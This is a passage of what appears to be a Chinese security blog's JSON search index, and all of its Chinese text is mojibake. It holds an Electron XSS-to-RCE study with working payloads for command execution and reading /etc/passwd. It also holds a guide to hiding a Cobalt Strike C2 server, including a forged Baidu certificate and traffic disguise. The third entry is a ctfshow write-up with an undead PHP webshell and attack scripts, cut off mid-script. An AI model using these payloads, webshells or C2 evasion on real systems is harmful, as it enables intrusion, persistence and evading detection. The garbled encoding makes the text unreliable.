Tokenå±‚é¢æ¥å…¥æ‰‹ï¼Œåšå¦‚ä¸‹è€ƒé‡ï¼š\né¦–å…ˆæ˜¯è·å–STS Tokençš„æ¥å£ï¼Œä¸ºäº†é˜²æ­¢è¯¥æ¥å£è¢«æ»¥ç”¨ï¼Œéœ€è¦æ¥å…¥é£æ§ï¼Œå¼‚å¸¸è°ƒç”¨åˆ™è§¦å‘ä¸šåŠ¡å‘Šè­¦ å…¶æ¬¡ï¼Œè™½ç„¶STS Tokené™åˆ¶äº†æœ‰æ•ˆæœŸï¼Œä½†ä»éœ€è¦å¯¹å…¶å¢åŠ é™åˆ¶ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯è·å–STS Tokenæ—¶éœ€è¦å¢åŠ ä¸€ä¸ªfileNameå‚æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨è¯¥Tokenå›ºå®šåªèƒ½ä¸Šä¼ è¿™ä¸ªæŒ‡å®šçš„æ–‡ä»¶åï¼Œè¿™æ ·ä¸€æ¥ï¼Œä¸è®ºå¤šå°‘æ¬¡ä¸Šä¼ éƒ½åªæ˜¯è¦†ç›–åŒä¸€æ–‡ä»¶ï¼Œé™ä½äº†é£é™© "
    }
,
    {
        "title": "å…³äºelectron XSS2RCEçš„ç ”ç©¶",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%85%B3%E4%BA%8Eelectron-xss2rce%E7%9A%84%E7%A0%94%E7%A9%B6/",
        "content": "å…³äºelectron XSS2RCEçš„ç ”ç©¶ æ¯æ¬¡å¬è§XSS2RCEï¼Œç¬¬ä¸€ååº”éƒ½æ˜¯ï¼šå®¢æˆ·ç«¯ï¼Ÿelectronï¼Ÿä¸è¿‡ä¸€ç›´æ˜¯çŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œäºæ˜¯ç°åœ¨æ¥ä»”ç»†äº†è§£ä¸€ä¸‹å…¶ä¸­çš„åŸç†\nå¤šè¿›ç¨‹é€šä¿¡ Electroné‡‡ç”¨å¤šè¿›ç¨‹æ¶æ„ï¼Œæœ‰ä¸¤ç§è¿›ç¨‹ï¼š\nä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰ï¼šæ‹¥æœ‰å®Œæ•´ç³»ç»Ÿæƒé™ï¼Œè´Ÿè´£çª—å£ç®¡ç†ã€åŸç”ŸAPIè°ƒç”¨ï¼Œå®ƒè¿è¡Œåœ¨Node.jsç¯å¢ƒä¸­,æ‹¥æœ‰å®Œæ•´çš„ç³»ç»Ÿè®¿é—®æƒé™,å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€è®¿é—®æ–‡ä»¶ç³»ç»Ÿ\næ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰ï¼šåŸºäºChromiumçš„ç½‘é¡µç¯å¢ƒï¼Œå¤„ç†UIæ¸²æŸ“ï¼Œåªæœ‰å—é™çš„æƒé™\nä¸¤è€…é€šè¿‡IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ æœºåˆ¶äº¤äº’ï¼Œä½†é»˜è®¤é…ç½®ä¸‹ï¼Œè¿™ç§é€šä¿¡ç¼ºä¹ä¸¥æ ¼çš„æƒé™æ ¡éªŒ\nåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ç®€å•ç†è§£å…¶æ¶æ„ä¸ºæµè§ˆå™¨å†…æ ¸+Node.js\nå®‰å…¨é…ç½®é¡¹ ä¸€äº›é”™è¯¯çš„é…ç½®ä¼šå¯¼è‡´æ¼æ´é£é™©çš„å¢åŠ ï¼š\nnodeIntegration: trueï¼šç›´æ¥åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­å¯ç”¨Node.jsç¯å¢ƒï¼Œå³è®©æ¸²æŸ“è¿›ç¨‹é‡Œçš„ç½‘é¡µä»£ç å¯ä»¥ç›´æ¥ä½¿ç”¨å®Œæ•´çš„ Node.js ç¯å¢ƒï¼ŒåŒ…æ‹¬å¯¹æ–‡ä»¶ã€æ“ä½œç³»ç»Ÿçš„æ§åˆ¶åŠŸèƒ½\ncontextIsolation: falseï¼šå…³é—­ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œpreload è„šæœ¬ã€ç½‘é¡µè„šæœ¬ã€Electron å†…éƒ¨æ‰©å±•å…±äº«åŒä¸€ä¸ª V8 å…¨å±€ä¸Šä¸‹æ–‡ï¼Œäº’ç›¸å¯è§å¯è°ƒç”¨\nenableRemoteModule: trueï¼šè¯¥æœºåˆ¶å…è®¸æ¸²æŸ“è¿›ç¨‹é€šè¿‡ remote è°ƒç”¨ä¸»è¿›ç¨‹èƒ½åŠ›ï¼Œå·²è¢«å®˜æ–¹æ˜ç¡®æ ‡è®°ä¸ºä¸æ¨èä½¿ç”¨ï¼Œå¹¶åœ¨æ–°ç‰ˆæœ¬ä¸­é€æ­¥å¼ƒç”¨\nXSSåˆ°RCEçš„åˆ©ç”¨ æˆ‘ä»¬åˆ°è¿™é‡Œå·²ç»å¤§è‡´èƒ½æƒ³åˆ°æ”»å‡»é“¾è·¯äº†ï¼Œå³é€šè¿‡åœ¨æ¸²æŸ“è¿›ç¨‹è§¦å‘XSSï¼Œå¹¶å°è¯•é€šè¿‡XSSæ¥æ§åˆ¶Node APIï¼Œå®ç°å¯¹ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶\næˆ‘å†™äº†ä¸€ä¸ªmarkdownæ–‡æœ¬ç¼–è¾‘å™¨æ¥æ¨¡æ‹Ÿelectronåº”ç”¨ï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥mdè¯­æ³•æ ¼å¼çš„æ–‡æœ¬ï¼š\nç‚¹å‡»previewå¯ä»¥é¢„è§ˆè§£æmdåçš„æ–‡æœ¬æ ·å¼ï¼š\næœ€ç†æƒ³çš„æƒ…å†µ æˆ‘åœ¨ä»£ç å¼€å¯äº†å±é™©é…ç½®ï¼š ç”±äºè¿™ä¸¤ä¸ªæ¡ä»¶å‡å¼€å¯ï¼Œé¡µé¢ JS å¯ä»¥ç›´æ¥è°ƒç”¨ Node.js çš„ requireï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨child_process æ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå®ç° RCEï¼Œè¿™é‡Œé€‰æ‹©å¼¹è®¡ç®—å™¨çš„payloadï¼š\n\u0026lt;img src=x onerror=\u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;open -a Calculator\u0026#39;)\u0026#34;\u0026gt; ç‚¹å‡»é¢„è§ˆï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸè§¦å‘äº†XXS2RCEï¼š\nå…³é—­nodeIntegration æ¥ä¸‹æ¥æ˜¯å…³é—­nodeIntegrationçš„æƒ…å†µï¼š\nåˆ©ç”¨æ–¹æ³•ä¼šæ¯”è¾ƒè‹›åˆ»ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æš´éœ²çš„IPCæ¥å£ï¼Œä¾‹å¦‚æˆ‘åœ¨ä»£ç åšäº†å¦‚ä¸‹å®ç°ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªç”¨äºè¯»æ–‡ä»¶çš„IPCï¼Œè€Œè¿™ä¸ªIPCåˆè¢«æš´éœ²äº†å‡ºæ¥ï¼š\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡XSSå‘é€æ„é€ å¥½çš„IPCæ¶ˆæ¯æ¥è¯»æ–‡ä»¶ï¼Œè¿™é‡Œpayloadé€‰æ‹©è¯»å–/etc/passwdæ–‡ä»¶ï¼š\n\u0026lt;img src=x style=\u0026#34;display:none\u0026#34; onerror=\u0026#34;ipcRenderer.send(\u0026#39;read-file\u0026#39;, \u0026#39;/etc/passwd\u0026#39;)\u0026#34;\u0026gt; æ­¤æ—¶ç‚¹å‡»é¢„è§ˆå°±ä¼šè§¦å‘XSSï¼Œå®ç°è¯»æ–‡ä»¶æ“ä½œï¼š å¯ç”¨contextIsolation åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¦‚æœå¯ç”¨äº†contextIsolationå‘¢ï¼Ÿäº‹å®ä¸Šï¼Œå¦‚æœå…³é—­äº† sandbox å¹¶ä¸” Preload è„šæœ¬å†™å¾—ä¸å®‰å…¨ï¼Œä¹Ÿä¼šå­˜åœ¨å®‰å…¨é£é™©ï¼š\nä»€ä¹ˆæ˜¯sandboxé€‰é¡¹ï¼Ÿ\nåœ¨è¾ƒæ–°çš„ Electron ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤å¼€å¯äº† Sandbox ã€‚ å½“ Sandbox å¼€å¯æ—¶ï¼ŒPreload è„šæœ¬åªèƒ½è®¿é—®æå…¶æœ‰é™çš„ Electron APIï¼ˆå¦‚ ipcRenderer ï¼‰ï¼Œ æ— æ³•è®¿é—® shell æ¨¡å— ã€‚ ä¸‹é¢æ˜¯ä¸å®‰å…¨çš„preloadè„šæœ¬ç¤ºä¾‹ï¼Œç›´æ¥æš´éœ²äº†shellæ¨¡å—ï¼š åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨window.electron.shell.openExternalï¼Œå®ç°å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œæˆ‘ä»¬ä»ç„¶é€‰æ‹©è°ƒç”¨è®¡ç®—å™¨ï¼š\n\u0026lt;img src=x style=\u0026#34;display:none\u0026#34; onerror=\u0026#34;window.electron.shell.openExternal(\u0026#39;file:///System/Applications/Calculator.app\u0026#39;)\u0026#34;\u0026gt; ç‚¹å‡»é¢„è§ˆè¿›è¡Œæ¸²æŸ“ï¼ŒæˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\næ€»ç»“ è‡³æ­¤ï¼Œæˆ‘ä»¬äº†è§£äº†electron XSS2RCEçš„åŸºæœ¬åŸç†åŠå…¶åˆ©ç”¨ï¼Œå…¶é˜²å¾¡æªæ–½å¦‚ä¸‹ï¼š\nå…³é—­nodeIntegrationé€‰é¡¹\nå¼€å¯contextIsolationé€‰é¡¹\nå¼€å¯sandboxé€‰é¡¹\nå…³é—­enableRemoteModuleé€‰é¡¹\nIPC é€šä¿¡å®‰å…¨è®¾è®¡\nä½¿ç”¨CSPç­–ç•¥\n",
        "summary": "å…³äºelectron XSS2RCEçš„ç ”ç©¶ æ¯æ¬¡å¬è§XSS2RCEï¼Œç¬¬ä¸€ååº”éƒ½æ˜¯ï¼šå®¢æˆ·ç«¯ï¼Ÿelectronï¼Ÿä¸è¿‡ä¸€ç›´æ˜¯çŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œäºæ˜¯ç°åœ¨æ¥ä»”ç»†äº†è§£ä¸€ä¸‹å…¶ä¸­çš„åŸç†\nå¤šè¿›ç¨‹é€šä¿¡ Electroné‡‡ç”¨å¤šè¿›ç¨‹æ¶æ„ï¼Œæœ‰ä¸¤ç§è¿›ç¨‹ï¼š\nä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰ï¼šæ‹¥æœ‰å®Œæ•´ç³»ç»Ÿæƒé™ï¼Œè´Ÿè´£çª—å£ç®¡ç†ã€åŸç”ŸAPIè°ƒç”¨ï¼Œå®ƒè¿è¡Œåœ¨Node.jsç¯å¢ƒä¸­,æ‹¥æœ‰å®Œæ•´çš„ç³»ç»Ÿè®¿é—®æƒé™,å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€è®¿é—®æ–‡ä»¶ç³»ç»Ÿ\næ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰ï¼šåŸºäºChromiumçš„ç½‘é¡µç¯å¢ƒï¼Œå¤„ç†UIæ¸²æŸ“ï¼Œåªæœ‰å—é™çš„æƒé™\nä¸¤è€…é€šè¿‡IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ æœºåˆ¶äº¤äº’ï¼Œä½†é»˜è®¤é…ç½®ä¸‹ï¼Œè¿™ç§é€šä¿¡ç¼ºä¹ä¸¥æ ¼çš„æƒé™æ ¡éªŒ\nåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ç®€å•ç†è§£å…¶æ¶æ„ä¸ºæµè§ˆå™¨å†…æ ¸+Node.js\nå®‰å…¨é…ç½®é¡¹ ä¸€äº›é”™è¯¯çš„é…ç½®ä¼šå¯¼è‡´æ¼æ´é£é™©çš„å¢åŠ ï¼š\nnodeIntegration: trueï¼šç›´æ¥åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­å¯ç”¨Node.jsç¯å¢ƒï¼Œå³è®©æ¸²æŸ“è¿›ç¨‹é‡Œçš„ç½‘é¡µä»£ç å¯ä»¥ç›´æ¥ä½¿ç”¨å®Œæ•´çš„ Node.js ç¯å¢ƒï¼ŒåŒ…æ‹¬å¯¹æ–‡ä»¶ã€æ“ä½œç³»ç»Ÿçš„æ§åˆ¶åŠŸèƒ½\ncontextIsolation: falseï¼šå…³é—­ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œpreload è„šæœ¬ã€ç½‘é¡µè„šæœ¬ã€Electron å†…éƒ¨æ‰©å±•å…±äº«åŒä¸€ä¸ª V8 å…¨å±€ä¸Šä¸‹æ–‡ï¼Œäº’ç›¸å¯è§å¯è°ƒç”¨\nenableRemoteModule: trueï¼šè¯¥æœºåˆ¶å…è®¸æ¸²æŸ“è¿›ç¨‹é€šè¿‡ remote è°ƒç”¨ä¸»è¿›ç¨‹èƒ½åŠ›ï¼Œå·²è¢«å®˜æ–¹æ˜ç¡®æ ‡è®°ä¸ºä¸æ¨èä½¿ç”¨ï¼Œå¹¶åœ¨æ–°ç‰ˆæœ¬ä¸­é€æ­¥å¼ƒç”¨\nXSSåˆ°RCEçš„åˆ©ç”¨ æˆ‘ä»¬åˆ°è¿™é‡Œå·²ç»å¤§è‡´èƒ½æƒ³åˆ°æ”»å‡»é“¾è·¯äº†ï¼Œå³é€šè¿‡åœ¨æ¸²æŸ“è¿›ç¨‹è§¦å‘XSSï¼Œå¹¶å°è¯•é€šè¿‡XSSæ¥æ§åˆ¶Node APIï¼Œå®ç°å¯¹ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶\næˆ‘å†™äº†ä¸€ä¸ªmarkdownæ–‡æœ¬ç¼–è¾‘å™¨æ¥æ¨¡æ‹Ÿelectronåº”ç”¨ï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥mdè¯­æ³•æ ¼å¼çš„æ–‡æœ¬ï¼š\nç‚¹å‡»previewå¯ä»¥é¢„è§ˆè§£æmdåçš„æ–‡æœ¬æ ·å¼ï¼š\næœ€ç†æƒ³çš„æƒ…å†µ æˆ‘åœ¨ä»£ç å¼€å¯äº†å±é™©é…ç½®ï¼š ç”±äºè¿™ä¸¤ä¸ªæ¡ä»¶å‡å¼€å¯ï¼Œé¡µé¢ JS å¯ä»¥ç›´æ¥è°ƒç”¨ Node.js çš„ requireï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨child_process æ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå®ç° RCEï¼Œè¿™é‡Œé€‰æ‹©å¼¹è®¡ç®—å™¨çš„payloadï¼š\n\u0026lt;img src=x onerror=\u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;open -a Calculator\u0026#39;)\u0026#34;\u0026gt; ç‚¹å‡»é¢„è§ˆï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸè§¦å‘äº†XXS2RCEï¼š\nå…³é—­nodeIntegration æ¥ä¸‹æ¥æ˜¯å…³é—­nodeIntegrationçš„æƒ…å†µï¼š\nåˆ©ç”¨æ–¹æ³•ä¼šæ¯”è¾ƒè‹›åˆ»ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æš´éœ²çš„IPCæ¥å£ï¼Œä¾‹å¦‚æˆ‘åœ¨ä»£ç åšäº†å¦‚ä¸‹å®ç°ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªç”¨äºè¯»æ–‡ä»¶çš„IPCï¼Œè€Œè¿™ä¸ªIPCåˆè¢«æš´éœ²äº†å‡ºæ¥ï¼š\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡XSSå‘é€æ„é€ å¥½çš„IPCæ¶ˆæ¯æ¥è¯»æ–‡ä»¶ï¼Œè¿™é‡Œpayloadé€‰æ‹©è¯»å–/etc/passwdæ–‡ä»¶ï¼š\n\u0026lt;img src=x style=\u0026#34;display:none\u0026#34; onerror=\u0026#34;ipcRenderer.send(\u0026#39;read-file\u0026#39;, \u0026#39;/etc/passwd\u0026#39;)\u0026#34;\u0026gt; æ­¤æ—¶ç‚¹å‡»é¢„è§ˆå°±ä¼šè§¦å‘XSSï¼Œå®ç°è¯»æ–‡ä»¶æ“ä½œï¼š å¯ç”¨contextIsolation åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¦‚æœå¯ç”¨äº†contextIsolationå‘¢ï¼Ÿäº‹å®ä¸Šï¼Œå¦‚æœå…³é—­äº† sandbox å¹¶ä¸” Preload è„šæœ¬å†™å¾—ä¸å®‰å…¨ï¼Œä¹Ÿä¼šå­˜åœ¨å®‰å…¨é£é™©ï¼š\n"
    }
,
    {
        "title": "C2æœåŠ¡å™¨éšè—",
        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/c2%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9A%90%E8%97%8F/",
        "content": "C2æœåŠ¡å™¨éšè— æœåŠ¡ç«¯é…ç½® æœåŠ¡å™¨ç¦ping ç¼–è¾‘æ–‡ä»¶/etc/sysctl.confï¼Œåœ¨é‡Œé¢å¢åŠ ä¸€è¡Œï¼š\nnet.ipv4.icmp_echo_ignore_all=1 ä¹‹åä½¿å‘½å‘½ä»¤ä½¿é…ç½®ç”Ÿæ•ˆ:\nsysctl -p è¿™æ ·å¯ä»¥ä½¿æœåŠ¡å™¨è¢«pingæ¢æµ‹æ—¶è¢«åˆ¤å®šä¸ºæœªå­˜æ´»ï¼Œä½†ä¾æ—§ä¼šè¢«nmapæ‰«æåˆ°\né»˜è®¤ç«¯å£æ›´æ”¹ æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°†åŸæœ¬çš„50050æ›´æ”¹åˆ°ä¸€ä¸ªä¸å¸¸ç”¨ç«¯å£å³å¯ï¼š\nä¿®æ”¹é»˜è®¤è¯ä¹¦ å› ä¸ºcsæœåŠ¡ç«¯ç”Ÿæˆçš„è¯ä¹¦å«æœ‰csçš„ç›¸å…³ç‰¹å¾æ‰€æœ‰ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¿®æ”¹æ›¿æ¢ï¼Œæ–¹æ³•æœ‰ä¿®æ”¹å¯†é’¥åº“å’Œä¿®æ”¹å¯åŠ¨æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸€ç§ï¼š\nåˆ é™¤å¯†é’¥åº“æ–‡ä»¶cobaltstrike.store\nrm -rf cobaltstrike.store ç”Ÿæˆæ–°çš„å¯†é’¥åº“æ–‡ä»¶\nkeytool -keystore ./cobaltstrike.store -storepass 051024 -keypass 051024 -genkey -keyalg RSA -alias baidu -dname \u0026#34;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\\, Ltd, L=beijing, S=beijing, C=CN\u0026#34; å¯ä»¥æŸ¥çœ‹æ–°çš„è¯ä¹¦ï¼š\nkeytool -list -keystore cobaltstrike.store å¯ä»¥å¯åŠ¨teamserveræŸ¥çœ‹ç­¾åæ˜¯å¦æ›´æ”¹ï¼š C2ä¾§å†™(profile)éšè—æµé‡ profileå¯ä»¥æŠŠc2çš„æµé‡æ··æ·†åˆ°ä¸€äº›æ­£å¸¸çš„è¯·æ±‚ä¸­ï¼Œå‡å°‘æµé‡ç‰¹å¾\næˆ‘ç”¨çš„æ˜¯å·²ç»äºŒå¼€äº†çš„çŒ«çŒ«CSï¼Œå·²ç»è‡ªå¸¦ä¼ªè£…jqueryè¯·æ±‚çš„profileï¼Œå½“ç„¶ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå·±é…ç½®ï¼š ä½¿ç”¨CDNéšè—çœŸå®IP è¿™ä¸€æ­¥ä¸è®ºæ˜¯åŸŸåè´­ä¹°ã€é‚®ç®±æ³¨å†Œã€CDNç”³è¯·éƒ½æœ€å¥½ä½¿ç”¨å›½å¤–æˆ–åŒ¿åï¼Œè´¢åŠ›ä¸è¶³æš‚æ—¶æç½®ã€‚ã€‚ã€‚\nåå‘ä»£ç† å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨åå‘ä»£ç†è¿›è¡ŒIPçš„éšè—\n",
        "summary": "C2æœåŠ¡å™¨éšè— æœåŠ¡ç«¯é…ç½® æœåŠ¡å™¨ç¦ping ç¼–è¾‘æ–‡ä»¶/etc/sysctl.confï¼Œåœ¨é‡Œé¢å¢åŠ ä¸€è¡Œï¼š\nnet.ipv4.icmp_echo_ignore_all=1 ä¹‹åä½¿å‘½å‘½ä»¤ä½¿é…ç½®ç”Ÿæ•ˆ:\nsysctl -p è¿™æ ·å¯ä»¥ä½¿æœåŠ¡å™¨è¢«pingæ¢æµ‹æ—¶è¢«åˆ¤å®šä¸ºæœªå­˜æ´»ï¼Œä½†ä¾æ—§ä¼šè¢«nmapæ‰«æåˆ°\né»˜è®¤ç«¯å£æ›´æ”¹ æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°†åŸæœ¬çš„50050æ›´æ”¹åˆ°ä¸€ä¸ªä¸å¸¸ç”¨ç«¯å£å³å¯ï¼š\nä¿®æ”¹é»˜è®¤è¯ä¹¦ å› ä¸ºcsæœåŠ¡ç«¯ç”Ÿæˆçš„è¯ä¹¦å«æœ‰csçš„ç›¸å…³ç‰¹å¾æ‰€æœ‰ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¿®æ”¹æ›¿æ¢ï¼Œæ–¹æ³•æœ‰ä¿®æ”¹å¯†é’¥åº“å’Œä¿®æ”¹å¯åŠ¨æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸€ç§ï¼š\nåˆ é™¤å¯†é’¥åº“æ–‡ä»¶cobaltstrike.store\nrm -rf cobaltstrike.store ç”Ÿæˆæ–°çš„å¯†é’¥åº“æ–‡ä»¶\nkeytool -keystore ./cobaltstrike.store -storepass 051024 -keypass 051024 -genkey -keyalg RSA -alias baidu -dname \u0026#34;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\\, Ltd, L=beijing, S=beijing, C=CN\u0026#34; å¯ä»¥æŸ¥çœ‹æ–°çš„è¯ä¹¦ï¼š\nkeytool -list -keystore cobaltstrike.store å¯ä»¥å¯åŠ¨teamserveræŸ¥çœ‹ç­¾åæ˜¯å¦æ›´æ”¹ï¼š C2ä¾§å†™(profile)éšè—æµé‡ profileå¯ä»¥æŠŠc2çš„æµé‡æ··æ·†åˆ°ä¸€äº›æ­£å¸¸çš„è¯·æ±‚ä¸­ï¼Œå‡å°‘æµé‡ç‰¹å¾\næˆ‘ç”¨çš„æ˜¯å·²ç»äºŒå¼€äº†çš„çŒ«çŒ«CSï¼Œå·²ç»è‡ªå¸¦ä¼ªè£…jqueryè¯·æ±‚çš„profileï¼Œå½“ç„¶ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå·±é…ç½®ï¼š ä½¿ç”¨CDNéšè—çœŸå®IP è¿™ä¸€æ­¥ä¸è®ºæ˜¯åŸŸåè´­ä¹°ã€é‚®ç®±æ³¨å†Œã€CDNç”³è¯·éƒ½æœ€å¥½ä½¿ç”¨å›½å¤–æˆ–åŒ¿åï¼Œè´¢åŠ›ä¸è¶³æš‚æ—¶æç½®ã€‚ã€‚ã€‚\nåå‘ä»£ç† å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨åå‘ä»£ç†è¿›è¡ŒIPçš„éšè—\n"
    }
,
    {
        "title": "ctfshow-æƒé™ç»´æŒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
        "content": "ctfshow-æƒé™ç»´æŒ web670 è¿™é‡Œçš„checkè²Œä¼¼æ˜¯åˆ webæ ¹ç›®å½•æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨awdçš„å¸¸è§„æ€è·¯ï¼Œå†™ä¸€ä¸ªä¸æ­»é©¬ï¼š\nGET:?action=cmd POST:cmd=file_put_contents(\u0026#39;a.php\u0026#39;, \u0026#39;\u0026lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \\\u0026#39;shell.php\\\u0026#39;;$code = \\\u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\\\u0026#39;;while (1) {file_put_contents($file, $code);usleep(5000);}?\u0026gt;\u0026#39;); è®¿é—®ä¸æ­»é©¬ä½¿å…¶è§£æï¼Œå°†æœ¨é©¬å†™å…¥å†…å­˜\nç„¶åç”³è¯·checkï¼Œå†è¿æ¥shell.phpå³å¯ï¼š\nweb671 åŒæ ·å†™ä¸æ­»é©¬å³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ï¼š\nweb672 åŒç†ï¼š\nweb673 åŒç†ã€‚ã€‚\næ—¢ç„¶ä¸æ­»é©¬ä¸€ç›´èƒ½æ‰“ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªpythonè„šæœ¬ï¼š\nimport requests url=\u0026#34;http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/\u0026#34; data1={\u0026#39;cmd\u0026#39;:\u0026#34;file_put_contents(\u0026#39;a.php\u0026#39;,\\\u0026#34;\u0026lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\\\$file = \u0026#39;shell.php\u0026#39;;\\\\$code = \u0026#39;\u0026lt;?php @eval(\\\\$_POST[1]);?\u0026gt;\u0026#39;;while (1) {file_put_contents(\\\\$file, \\\\$code);usleep(5000);}?\u0026gt;\\\u0026#34;);\u0026#34;} r=requests.post(url+\u0026#39;?action=cmd\u0026#39;,data=data1) try: requests.get(url+\u0026#39;a.php\u0026#39;,timeout=(1,1)) except: requests.get(url+\u0026#39;?action=check\u0026#39;) r=requests.post(url+\u0026#39;shell.php\u0026#39;,data={\u0026#39;1\u0026#39;:\u0026#39;system(\u0026#34;cat /f*\u0026#34;);\u0026#39;}) print(r.text) ä¸€è·‘å³å‡ºï¼š\nweb674-676 åŒç†ï¼Œè„šæœ¬è·‘å³å¯\nweb677 é™¤äº†tmpç›®å½•éƒ½æ²¡æœ‰å†™æƒé™\nè¿™é‡ŒåŒæ ·å¯ä»¥ç”¨åŠ è½½è¿›ç¨‹çš„æ€ç»´ï¼š\nGET:?action=cmd POST:cmd=system(\u0026#39;sleep 10;cat /f*\u0026#39;); æ‰§è¡Œåä¼šåŠ è½½åç§’ï¼Œåœ¨æ­¤æœŸé—´ï¼Œå¦å¼€ä¸€ä¸ªé¡µé¢æ¥å¯åŠ¨checkï¼Œå³å¯catåˆ°flagï¼š\nweb678 checkåï¼Œä¼šåœæ­¢ä¸€åˆ‡webæœåŠ¡ï¼ŒåŒ…æ‹¬nginx php-fpm å¤©åœ°åŒå¯¿çš„æ‰“æ³•ï¼Œä½ èƒ½åº”ä»˜å—\ntmpç›®å½•å¯å†™ï¼Œé‚£ä¹ˆå°±åœ¨è¿™ä¸ªç›®å½•ä¸Šåšæ–‡ç« \nä¸­é—´ä»¶éƒ½æ²¡äº†ï¼Œé‚£å°±ç”¨phpç›´æ¥åœ¨/tmpèµ·ä¸€ä¸ªæœåŠ¡ï¼Œå°±èƒ½è§£ætmpä¸­çš„phpæ–‡ä»¶äº†\ntmpç›®å½•ä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶:\ncmd=system(\u0026#39;cd /tmp;echo \u0026#34;\u0026lt;?php eval(\\$_POST[1]);?\u0026gt;\u0026#34; \u0026gt; index.php\u0026#39;); å¼€å¯webæœåŠ¡ï¼š\ncmd=system(\u0026#39;cd /tmp;php -S 0.0.0.0:80\u0026#39;); å‰é¢çš„æ€è·¯ç»“åˆä¸€ä¸‹ï¼Œå› ä¸ºæ‰‹åŠ¨å¼€å¯çš„webæœåŠ¡checkåä¹Ÿä¼šè¢«åœæ‰ï¼Œæ‰€ä»¥è¦checkå¹¶å»¶æ—¶å¼€å¼€å¯webæœåŠ¡ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\nimport requests url=\u0026#34;http://bd71e0b1-031d-413b-8e3c-9f9e6d912d7b.challenge.ctf.show\u0026#34; data1={\u0026#39;cmd\u0026#39;:\u0026#34;system(\u0026#39;cd /tmp;echo \\\u0026#34;\u0026lt;?php eval(\\$_POST[1]);?\u0026gt;\\\u0026#34; \u0026gt; index.php\u0026#39;);\u0026#34;} r=requests.post(url+\u0026#39;?action=cmd\u0026#39;,data=data1) 